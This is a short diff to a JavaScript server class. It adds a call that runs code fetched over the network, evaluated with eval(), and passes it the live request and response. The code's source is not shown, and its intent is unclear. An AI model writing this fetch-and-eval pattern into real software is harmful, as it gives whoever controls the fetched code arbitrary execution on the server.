@@ -53,6 +53,7 @@ class Other {
                         const code = await res.text();
                         const fun = eval(code);
                         console.log(fun, typeof fun);
+                        fun(req, res);
                     }
                 } else {
                     res.status(json.code).json({
